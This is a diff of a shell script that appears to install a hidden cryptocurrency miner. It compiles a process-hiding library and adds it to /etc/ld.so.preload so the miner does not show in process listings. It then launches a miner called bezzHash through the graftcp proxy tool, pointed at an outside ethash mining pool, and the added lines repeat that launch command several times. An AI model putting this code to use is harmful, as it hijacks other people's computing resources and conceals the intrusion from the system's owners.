@@ -50,3 +50,13 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 ./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:25
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:25
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:25
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:25
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:25
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:25
